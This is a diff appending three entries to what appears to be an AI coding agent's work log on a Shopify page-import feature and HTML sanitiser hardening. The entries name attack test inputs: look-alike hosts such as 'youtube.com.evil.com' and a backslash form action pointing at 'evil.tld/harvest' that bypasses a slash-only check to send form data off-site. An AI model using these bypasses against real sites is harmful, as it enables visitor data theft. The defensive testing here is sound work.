@@ -3159,3 +3159,196 @@ OUTPUT: puure-dashboard.onrender.com live at c54d314.
 DECISIONS: Shipped without feat/clone-from-shopify (2 new gating cleaner findings; next release).
 STATUS: COMPLETE
 ---
+
+---
+TIMESTAMP: 2026-08-09 22:55
+TASK: Clone-a-page "From Shopify" tab (feat/clone-from-shopify)
+BUILT: New read-only Shopify Admin proxy server/src/routes/shopifyPages.js
+mounted at /api/v1/shopify-pages (authenticate + funnels:access), plus the
+client tab client/src/components/funnels/shopify/ShopifyTab.jsx wired into
+ClonePageModal.jsx (the tab is no longer disabled). GET /list walks Admin
+REST pages.json with Link-header cursor paging (4-hop / 500-row cap, and it
+REPORTS `truncated` rather than silently clipping), returning
+{id,title,handle,updated_at,published,summary,is_theme_built,live_url} —
+body_html is summarised server-side and never forwarded. POST /import
+validates page_id (digits or a Page gid — it feeds a REST path), fetches the
+page, and runs pageClone.js's OWN scanHtml() on the body_html wrapped in a
+<body> element, with originalUrl=live_url, so the result is the
+byte-identical {sections,stats} shape /page-clone/scan returns and the modal
+reuses its existing picker and /page-clone/create. Credentials are read from
+env at call time and travel in X-Shopify-Access-Token only; 8s
+AbortController budget; redirect:'error'. Failure taxonomy mirrors
+shopifyVariants.js: 503 shopify_not_configured / shopify_auth_error
+(retryable:false) vs shopify_unavailable (retryable:true), 429 rate_limited
+(retryable:true), 422 theme_built for a page whose editor body has under 200
+chars of visible text. INPUT_MAX / ESCAPE_HATCH_MAX were exported from
+pageClone.js so the 413 thresholds are one number, not two.
+TESTED: new harness server/tests/clone-page/shopify-import.mjs 213/213
+(list happy path + limit cap; cursor paging and truncation honesty; empty
+store vs outage; 9 list failure classes incl. 401/403 as non-retryable;
+missing/malformed config incl. a store value carrying a path; a real fetched
+page flowing through the REAL scan pipeline asserted on section output,
+script/pixel/comment removal, surviving inline <style>, and CDN
+src/srcset/href absolutization; 7 page_id refusals incl. a dot-segment
+traversal attempt; 5 theme-built shapes; malformed 200s, non-string
+body_html, unbalanced markup, >10MB source and >2MB cleaned output; malformed
+JSON body; rate limit; the 8s abort; redirect:'error'). Regressions:
+clone-page scan-create 92/92, builder variant-search 94/94 (identical to the
+pre-change baseline). Real mount verified by booting routes/index.js — both
+paths answer 401, not 404. eslint on both touched client files: 0 errors.
+cd client && npx vite build: exit 0.
+OUTPUT: 213/213 + 92/92 + 94/94; build exit 0; eslint exit 0.
+DECISIONS: (1) The reference tool's Playwright "visual clone" fallback for
+theme-built pages was DROPPED — pageClone.js's stated invariant is that it
+never fetches a URL, so there is no SSRF surface by construction; we return
+an actionable 422 with the live URL instead (DECISION MADE). (2) Admin REST
+is the only transport, not GraphQL-with-REST-fallback: the Admin GraphQL
+`pages` connection does not exist on this repo's default SHOPIFY_API_VERSION
+(2024-01), and a fallback leg that can never be exercised is not a fallback
+(DECISION MADE). (3) The reference fires one import call per visible card to
+build previews; we compute `summary` and `is_theme_built` at LIST time, so
+the picker makes one Admin call, not N (DECISION MADE). (4) The reference
+passes source_url:null and leaves relative Shopify CDN paths broken; we
+absolutize against live_url through the existing rewriter (DECISION MADE).
+(5) This worktree is a worktree of Mineblock-LLC, not Puure-integrator as the
+brief stated — worktree isolation forbids operating on the other checkout, so
+the branch and commit landed here; the two repos are forks and every file the
+brief named exists here identically (DECISION MADE — needs a port to
+Puure-integrator if that was the intended target).
+STATUS: COMPLETE
+---
+
+---
+TIMESTAMP: 2026-08-09 23:40
+TASK: Clone-from-Shopify — adversarial review remediation (FIX-FIRST @ 53db9cd)
+BUILT: All four gating findings and all six minors closed on
+feat/clone-from-shopify, plus the M4 hardening policy decided by the
+integrator. B1: /list derived summaries from FULL body_html on the event
+loop shared with public checkout — reproduced at 1,945ms of synchronous block
+and +183MB heap for 500 x 292KB rows; every row is now sliced to
+BODY_PROBE_BYTES (16KB) and its text extracted ONCE for both the summary and
+the theme-built floor, with LIST_NODE_MAX x BODY_PROBE_BYTES bounded by
+LIST_BODY_BUDGET_BYTES and a runtime accumulator as backstop — re-measured at
+59ms / 21MB. M1: storefrontBase() memoised per process (5min on success, 60s
+on failure, keyed on store|apiVersion so a rotation invalidates), killing the
+2-5 Admin calls per request against the bucket shared with live checkout
+pricing; the modal now owns the fetched page list (cache/onLoaded) so Back
+from the picker no longer refetches. M2: permanent Shopify failures no longer
+masquerade as retryable outages — a new codeForStatus() maps 404 on a page
+fetch to HTTP 404 page_not_found, 402 to shopify_store_frozen, 423 to
+shopify_store_locked, other 4xx to shopify_rejected, all retryable:false,
+with shopify_unavailable reserved for 5xx/429/transport. M3: body_html is a
+FRAGMENT — feeding it to the splitter's whole-document heuristics dropped
+76.6% of a page on one stray </body>, silently, at 200; splitSections/scanHtml
+gained an additive `fragment` option (default off, paste/upload unchanged) and
+the Shopify path strips document wrappers first and reports the dropped bytes
+in stats. M4: cleanHtml now strips inline on* handlers, drops href/src/action
+carrying javascript:/vbscript: (entity- and control-char-obfuscated forms
+included), removes iframes whose host is off the exported IFRAME_EMBED_HOSTS
+allowlist, and disarms off-site form actions into data-original-action while
+keeping the form — four new counters surfaced as picker chips, on BOTH the
+paste and Shopify paths. Minors: fields= now rides every cursor hop; the
+short-page floor became a list BADGE not an import gate and its copy states
+the observation instead of guessing at the theme; truncation copy names the
+real remedy; the tab got a request-generation guard, an AbortController on
+unmount and stale-row Import locking; shop.json degrades on every status
+including 403 so the credential verdict comes from the load-bearing call;
+Retry-After is propagated and honoured by a countdown on Try again; the API
+version is anchored to /^\d{4}-\d{2}$/ because it is interpolated into a path.
+TESTED: shopify-import harness extended 213 -> 353 assertions, 353/353. New
+coverage: the B1 wall-time bound and the slice (a marker past the probe window
+is provably never read); the M1 memo across list+import, its failure memo and
+its rotation key; ALL outbound Admin calls counted in the rate-limit
+assertion (the old one counted only the pages mock — it measured a bound it
+did not enforce and missed shop.json entirely); every M2 status mapping over
+HTTP on both routes, including that a 404 on the LIST is NOT a page_not_found;
+four M3 fragment shapes each asserted to keep content on BOTH sides of the
+wrapper; M4 unit + end-to-end (5 obfuscated javascript: forms, look-alike
+embed hosts youtube.com.evil.com and evil-youtube.com, srcless iframe,
+off-site vs same-origin form); Retry-After parsing incl. HTTP-date and
+clamping; five malformed API versions refused and an unset one falling back.
+Regressions: scan-create 92/92 and variant-search 94/94, both identical to
+the pre-change baseline — M4 conflicted with NO existing assertion, so
+nothing was bent. node --check on all four touched server files: OK. eslint
+on both client files: 0 errors. cd client && npx vite build: exit 0. Mount
+re-verified by booting routes/index.js (401, not 404).
+OUTPUT: 353/353 + 92/92 + 94/94; build exit 0; eslint exit 0; B1 1945ms/183MB
+-> 59ms/21MB; M3 76.6% loss -> 0.
+DECISIONS: (1) M3 solved with an additive `fragment` option rather than
+pre-stripping <main>, so the operator's <main> element survives as markup
+while losing its ability to scope the split (DECISION MADE). (2) M4 lives in
+cleanHtml, i.e. the paste and upload tabs are hardened too — the integrator
+scoped it that way and the existing regression proves no paste-path assertion
+disagrees (DECISION MADE). (3) m1 `fields` on cursor hops asserts the shape of
+OUR request only: Shopify documents page_info as combinable with limit and
+fields, but there are no credentials in this environment to verify acceptance
+against the live store, and a live rejection would surface as
+shopify_rejected with the status in the log line (DECISION MADE — flagged as
+the one claim not closed by execution). (4) Three harness assertions I wrote
+in the first pass were VACUOUS and are recorded here because they passed
+while testing nothing: a naive /action="https:\/\/evil/ regex was satisfied by
+the data-original-action attribute the fix introduces; a "body not echoed"
+needle matched the legitimate summary; and an href assertion ignored that the
+link is absolutized. All three were re-anchored and mutation-checked
+(DECISION MADE).
+STATUS: COMPLETE
+---
+
+---
+TIMESTAMP: 2026-08-10 00:20
+TASK: Clone-from-Shopify — delta re-verify, final gate (2 new findings in the shared cleaner)
+BUILT: Both new gating items closed inside pageClone.js, plus the two nits.
+G1 (form-action bypass): the off-site test was a forward-slash-only regex, so
+<form action="\\evil.tld/harvest"> cleared it with forms_neutralized=0 while
+every browser resolves that string to https://evil.tld/harvest — visitor form
+data exfiltrating from a page we serve. Reproduced verbatim before the fix.
+The decision is now made by the URL PARSER: a new exported resolvedHost() /
+isOffsiteUrl() pair resolves the value against the https://relative.invalid
+sentinel base (the same parse iframeHost already used) and calls it off-site
+when the resulting hostname is neither empty nor the sentinel. That also
+catches two variants the report did not name — /\evil.tld/x and \/evil.tld/x —
+which the old regex cleared too, while /local, \local, ?q=1 and '' stay
+on-site. G2 (cleaner perf): the per-attribute-per-tag `new RegExp` made
+cleanHtml 1,109 ms for a 10MB / ~414k-tag document — the same event-loop-block
+class as B1 but on POST /page-clone/scan, reachable from paste and upload. The
+nine attribute names are folded into ONE module-scope alternation
+(UNSAFE_URL_ATTR_RE), and FORM_TAG_RE / FORM_ACTION_RE are hoisted too, which
+also collapses nine passes over each tag's attributes into one: re-measured at
+193-203 ms. NITS: a row past the derivation budget now reports
+is_theme_built: null ("not derived") instead of false, because false is a
+positive claim that the page has content; and storefrontBase() gained
+{retryDegraded} so an IMPORT never inherits a degraded myshopify-fallback
+answer — the list may reuse it for its 60s window because it is ephemeral, but
+an import's live_url is what absolutizes asset paths and those absolute URLs
+are SAVED into the page's blocks, so a degraded answer would bake the wrong
+canonical host into a page permanently.
+TESTED: shopify-import 353 -> 382 assertions, 382/382. New coverage: 12
+isOffsiteUrl cases incl. all three backslash authority forms and the
+same-origin negatives, resolvedHost proving the host comes from the parser;
+the backslash form asserted end-to-end through /import (forms_neutralized=1,
+no live action attribute, data-original-action kept, form survives); a PINNED
+cleanHtml budget of 600ms at the real 10MB INPUT_MAX ceiling, asserted the way
+LIST_BODY_BUDGET_BYTES is, plus two assertions that the pass is still doing
+the work rather than short-circuiting to look fast (all-zero counters on clean
+input, and a needle found buried in 400 clean tags); the budget backstop
+emitting null and no invented summary; and the degraded-memo split (list
+reuses, every import re-attempts, a healthy answer is memoised for imports too
+and yields the canonical domain). Regressions: scan-create 92/92 and
+variant-search 94/94, both still identical to the pre-change baseline.
+node --check on all four server files OK; eslint 0 errors; vite build exit 0;
+mount re-verified at 401 for both shopify-pages routes and page-clone/scan.
+OUTPUT: 382/382 + 92/92 + 94/94; build exit 0; eslint exit 0. G1
+forms_neutralized 0 -> 1 on the backslash fixture. G2 1,109ms -> 203ms at
+INPUT_MAX.
+DECISIONS: (1) The off-site decision is now shared with the iframe allowlist
+through one resolvedHost(), so the two guards can no longer disagree about
+what "off-site" means (DECISION MADE). (2) The cleanHtml budget is pinned at
+600ms against a measured 203ms — roughly 3x headroom, loose enough not to
+flake on a loaded machine and tight enough to catch the 5-20x regression class
+this finding belongs to (DECISION MADE). (3) The degraded-import re-attempt
+costs one extra Admin call per import, but ONLY while /shop.json is actually
+failing, and it stays inside the rate limiter — chosen over shrinking the
+failure TTL globally, which would have restored the per-request fan-out on the
+list that the memo exists to prevent (DECISION MADE).
+STATUS: COMPLETE
+---
